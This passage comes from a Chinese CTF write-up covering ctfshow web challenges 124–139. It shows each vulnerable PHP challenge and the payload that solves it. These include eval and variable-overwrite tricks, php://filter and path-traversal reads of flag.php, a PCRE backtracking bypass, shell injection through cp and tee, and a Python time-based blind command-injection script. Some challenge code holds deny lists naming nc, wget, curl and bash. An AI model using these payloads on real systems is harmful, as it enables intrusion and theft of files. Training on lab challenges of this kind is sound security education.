class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">18</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一开始是想执行fl0g其实是执行不了的，真是可以传值的只有利用fun，执行echo $flag，这里因为php特性改成[,再传给CTF_SHOW，就达成了判断条件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun= <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span><br></code></pre></td></tr></table></figure><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><h3 id="0x01-11"><a href="#0x01-11" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=var_export(get_defined_vars())<br></code></pre></td></tr></table></figure><p>无参数绕过常见的一种方法</p><h3 id="0x02-11"><a href="#0x02-11" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=highlight_file(<span class="hljs-variable">$_GET</span>[1])<br></code></pre></td></tr></table></figure><p><code>?1=flag.php</code></p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=1&amp;fun=include(<span class="hljs-variable">$_GET</span>[1])<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><h3 id="0x01-12"><a href="#0x01-12" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str(<span class="hljs-variable">$a</span>[1])<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a=1+fl0g=flag_give_me<br></code></pre></td></tr></table></figure><p><code>?a=1+fl0g=flag_give_me</code>。在之前的代码中存在 <code>parse_str($a[1])</code>，并且 <code>$a[1]</code> 是可控的输入，那么这里的查询字符串会被 <code>parse_str()</code> 函数解析。</p><p> <code>$a[1]</code> 包含 <code>fl0g=flag_give_me</code>，<code>parse_str($a[1])</code> 会将它解析为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$fl0g</span> = <span class="hljs-string">&quot;flag_give_me&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="0x02-12"><a href="#0x02-12" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert(<span class="hljs-variable">$a</span>[0])<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-variable">$fl0g</span>=flag_give_me<br></code></pre></td></tr></table></figure><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-10 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$ctf_show</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br><br><span class="hljs-comment">//特殊字符检测</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;嗯哼？&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf_show</span>===<span class="hljs-string">&#x27;ilove36d&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h3 id="0x01-13"><a href="#0x01-13" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctf show=ilove36d<br></code></pre></td></tr></table></figure><p>点或空格会被转化为下划线，由于点被过滤 ，所以可以用上空格。</p><h3 id="0x02-13"><a href="#0x02-13" class="headerlink" title="0x02"></a>0x02</h3><p>$_SERVER[‘QUERY_STRING’];获取的查询语句是服务端还没url解码之前的字符串，所以对_进行一次url编码也能绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ctf%5fshow=ilove36d<br></code></pre></td></tr></table></figure><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-10-10 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-12 19:49:05</span><br><br>*/<br><br><br>error_reporting(0);<br>include(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(__FILE__);<br><br><span class="hljs-variable">$f1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br><span class="hljs-variable">$f2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(check(<span class="hljs-variable">$f1</span>))&#123;<br>    var_dump(call_user_func(call_user_func(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>)));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;嗯哼？&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> check(<span class="hljs-variable">$str</span>)&#123;<br>    <span class="hljs-built_in">return</span> !preg_match(<span class="hljs-string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f1=_&amp;f2=get_defined_vars<br></code></pre></td></tr></table></figure><p>本地学到了,php扩展目录下有php_gettext.dll_()是一个函数。</p><p>_()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展get_defined_vars — 返回由所有已定义变量所组成的数组。</p><p>为了绕过正则，_()函数和gettext()的效果一样，所以可以用_()函数代替gettext()函数。</p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><h3 id="0x01-14"><a href="#0x01-14" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f=php://filter/convert.base64-encode/ctfshow/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="0x02-14"><a href="#0x02-14" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?f=/ctfshow/../../../../var/www/html/flag.php<br></code></pre></td></tr></table></figure><p>进行目录穿越</p><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-13 05:19:40</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="hljs-variable">$f</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;ctfshow&#x27;</span>) === <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bye!!&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x01-15"><a href="#0x01-15" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=ctfshow<br></code></pre></td></tr></table></figure><p>+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复,所以在ctfshow前面必须有至少一个字符，才会返回true</p><h3 id="0x02-15"><a href="#0x02-15" class="headerlink" title="0x02"></a>0x02</h3><p>PHP利用PCRE回溯次数限制绕过,前面加个100w个a就行</p><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>PHP利用PCRE回溯次数限制绕过,前面加个100w个a就行</p><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>进去是一个网站，默认看一下robots.txt，告诉&#x2F;admin,进去得到网页</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=admin&amp;password=1&amp;username=admin<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$code</span> === <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x36D</span>) &amp;&amp; <span class="hljs-variable">$password</span> === <span class="hljs-variable">$flag</span> || <span class="hljs-variable">$username</span> ===<span class="hljs-string">&quot;admin&quot;</span>)<br></code></pre></td></tr></table></figure><p>先运行<code>&amp;&amp;</code>再运行<code>||</code>，a||b如果前面的错了那么就运行后面的，如果前面对的就不看后面的了</p><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: Firebasky</span><br><span class="hljs-comment"># @Date:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-10-13 16:43:44</span><br><br>*/<br><br>error_reporting(0);<br>highlight_file(__FILE__);<br>//flag.php<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$F</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;F&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="hljs-variable">$F</span>))&#123;<br>        <span class="hljs-built_in">eval</span>(substr(<span class="hljs-variable">$F</span>,0,6));<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        die(<span class="hljs-string">&quot;6个字母都还不够呀?!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原理大致就是利用curl外带，然后dnslog进行，直接贴文章吧</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">ctfshow web133和其他命令执行的骚操作-CSDN博客</a></p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-14 23:01:06</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) || <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonononono&quot;</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> == <span class="hljs-string">&#x27;36d&#x27;</span> &amp;&amp; <span class="hljs-variable">$key2</span> == <span class="hljs-string">&#x27;36d&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?_POST[key1]=36d&amp;_POST[key2]=36d<br></code></pre></td></tr></table></figure><p>利用变量覆盖，执行</p><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?F=`<span class="hljs-variable">$F</span>`+;<span class="hljs-built_in">cp</span>+flag.php+1.txt<br></code></pre></td></tr></table></figure><p>自身的值在被eval时候直接引用自身，可以用cp把flag复制到1.txt访问 <code>?F=</code>$F<code>+;cp+flag.php+1.txt</code></p><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">ls</span> / |<span class="hljs-built_in">tee</span> 1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span> f149_15_h3r3 |<span class="hljs-built_in">tee</span> aa<br></code></pre></td></tr></table></figure><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow=ctfshow::getFlag<br></code></pre></td></tr></table></figure><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p><code>strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;) &gt; -1</code> 的检查条件意味着只要 POST 数据中包含冒号，代码就会终止。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag<br></code></pre></td></tr></table></figure><p>在 PHP 中，<code>call_user_func</code> 可以接收数组形式的参数来调用静态方法。这种方式可以绕过冒号检查，因为 <code>ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code> 并不包含冒号。</p><ul><li><code>ctfshow[0]=ctfshow</code>：表示调用 <code>ctfshow</code> 类的方法。</li><li><code>ctfshow[1]=getFlag</code>：表示调用 <code>getFlag</code> 方法。</li></ul><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$c</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和136差不多，但是测了一下好像并不能写入文件，应该是权限问题，跟着官p看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-built_in">str</span> = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;_~&#x27;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):  <span class="hljs-comment"># 行</span><br>    key = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">15</span>):  <span class="hljs-comment"># 列</span><br>        <span class="hljs-keyword">if</span> key == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>            <span class="hljs-comment"># awk &#x27;NR==&#123;0&#125;&#x27;逐行输出获取</span><br>            <span class="hljs-comment"># cut -c &#123;1&#125; 截取单个字符</span><br>            payload = <span class="hljs-string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="hljs-built_in">format</span>(i, j, n)<br>            <span class="hljs-comment"># print(payload)</span><br>            url = <span class="hljs-string">&quot;http://271efe3f-c200-4c7c-b5fc-0262498db523.challenge.ctf.show/?c=&quot;</span> + payload<br>            <span class="hljs-keyword">try</span>:<br>                requests.get(url, timeout=(<span class="hljs-number">2.5</span>, <span class="hljs-number">2.5</span>))<br>            <span class="hljs-keyword">except</span>:<br>                result = result + n<br>                <span class="hljs-built_in">print</span>(result)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> n == <span class="hljs-string">&#x27;~&#x27;</span>:<br>                key = <span class="hljs-number">1</span><br>                result += <span class="hljs-string">&quot; &quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Final result:&quot;</span>, 